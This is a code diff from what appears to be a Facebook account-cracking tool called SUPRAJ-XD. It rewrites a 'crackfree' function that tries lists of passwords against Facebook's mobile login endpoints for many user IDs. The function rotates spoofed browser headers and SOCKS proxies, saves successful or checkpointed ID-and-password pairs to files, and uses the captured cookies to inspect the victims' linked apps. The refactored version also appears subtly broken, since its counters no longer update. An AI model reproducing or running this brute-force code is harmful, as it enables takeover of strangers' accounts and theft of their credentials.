@@ -1235,45 +1235,134 @@ except requests.exceptions.ConnectionError:
 
 #------------------[ METHODE-MBASIC-2 ]-------------------#
 
-def crack_free(idf,pwv):
-    global loop,ok,cp
-    sys.stdout.write(f"\r {P}[SUPRAJ-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+# def crackfree(idf,pwv):
+#     global loop,ok,cp
+#     sys.stdout.write(f"\r {P}[SUPRAJ-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+#     sys.stdout.flush()
+#     ua = random.choice(ugen)
+#     ua2 = random.choice(ugen2)
+#     ses = requests.Session()
+#     for pw in pwv:
+#         try:
+#             nip=random.choice(prox)
+#             proxs= {'http': 'socks5://'+nip}
+#             ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
+#             p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+#             dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+#             koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+#             koki+=' m_pixel_ratio=2.625; wd=412x756'
+#             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+#             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+#             if "checkpoint" in po.cookies.get_dict().keys():
+            
+#                 print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
+#                 cek_apk(session,coki)
+#                 open('/sdcard/SUPRAJ-CP.txt', 'a').write(idf+' • '+pw+'\n')
+#                 akun.append(idf+' • '+pw)
+#                 cp+=1
+#                 break
+#             elif "c_user" in ses.cookies.get_dict().keys():
+#                 ok+=1
+#                 coki=po.cookies.get_dict()
+#                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+#                 print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
+#                 open('/sdcard/SUPRAJ-OK.txt', 'a').write(idf+' • '+pw+'\n')
+#                 break
+                
+#             else:
+#                 continue
+#         except requests.exceptions.ConnectionError:
+#             time.sleep(31)
+#     loop+=1
+
+import sys
+import time
+import random
+import requests
+import re
+
+def crackfree(idf, pwv, loop, ok, cp, session):
+    sys.stdout.write(f"\r [SUPRAJ-XD] {loop}/{len(id)} OK[{ok}] [{'{:.0%}'.format(loop/float(len(id)))}]  ")
     sys.stdout.flush()
+
     ua = random.choice(ugen)
-    ua2 = random.choice(ugen2)
-    ses = requests.Session()
+    ses = session or requests.Session()  # Reuse session if available
     for pw in pwv:
         try:
-            nip=random.choice(prox)
-            proxs= {'http': 'socks5://'+nip}
-            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
-            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
-            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-            koki+=' m_pixel_ratio=2.625; wd=412x756'
-            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+            # Use a random proxy if available
+            nip = random.choice(prox)
+            proxs = {'http': 'socks5://' + nip}
+
+            ses.headers.update({
+                "Host": 'm.facebook.com',
+                "upgrade-insecure-requests": "1",
+                "user-agent": ua,
+                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                "dnt": "1",
+                "x-requested-with": "mark.via.gp",
+                "sec-fetch-site": "same-origin",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-user": "empty",
+                "sec-fetch-dest": "document",
+                "referer": "https://m.facebook.com/",
+                "accept-encoding": "gzip, deflate br",
+                "accept-language": "en-US,en;q=0.9"
+            })
+
+            p = ses.get('https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
+
+            dataa = {
+                "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
+                "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
+                "uid": idf,
+                "next": "https://p.facebook.com/login/save-device/",
+                "flow": "login_no_pin",
+                "pass": pw,
+            }
+
+            koki = (";").join([f"{key}={value}" for key, value in p.cookies.get_dict().items()])
+            koki += ' m_pixel_ratio=2.625; wd=412x756'
+
+            heade = {
+                'Host': 'm.facebook.com',
+                'viewport-width': '980',
+                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-ch-prefers-color-scheme': 'light',
+                'dnt': '1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': ua,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'sec-fetch-site': 'none',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-user': '?1',
+                'sec-fetch-dest': 'document',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9'
+            }
+
+            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa,
+                          cookies={'cookie': koki}, headers=heade, allow_redirects=False)
+
             if "checkpoint" in po.cookies.get_dict().keys():
-            
-                print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
-                cek_apk(session,coki)
-                open('/sdcard/SUPRAJ-CP.txt', 'a').write(idf+' • '+pw+'\n')
-                akun.append(idf+' • '+pw)
-                cp+=1
+                print(f'\r [SUPRAJ-CP] [{time.strftime("%H:%M")}] {idf} | {pw}')
+                cek_apk(session, coki)
+                with open('/sdcard/SUPRAJ-CP.txt', 'a') as f:
+                    f.write(f"{idf} • {pw}\n")
+                cp += 1
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
-                ok+=1
-                coki=po.cookies.get_dict()
-                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
-                open('/sdcard/SUPRAJ-OK.txt', 'a').write(idf+' • '+pw+'\n')
+                ok += 1
+                coki = po.cookies.get_dict()
+                with open('/sdcard/SUPRAJ-OK.txt', 'a') as f:
+                    f.write(f"{idf} • {pw}\n")
                 break
-                
-            else:
-                continue
         except requests.exceptions.ConnectionError:
             time.sleep(31)
-    loop+=1
+
+    loop += 1
+
 
 def cek_apk(session,coki):
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
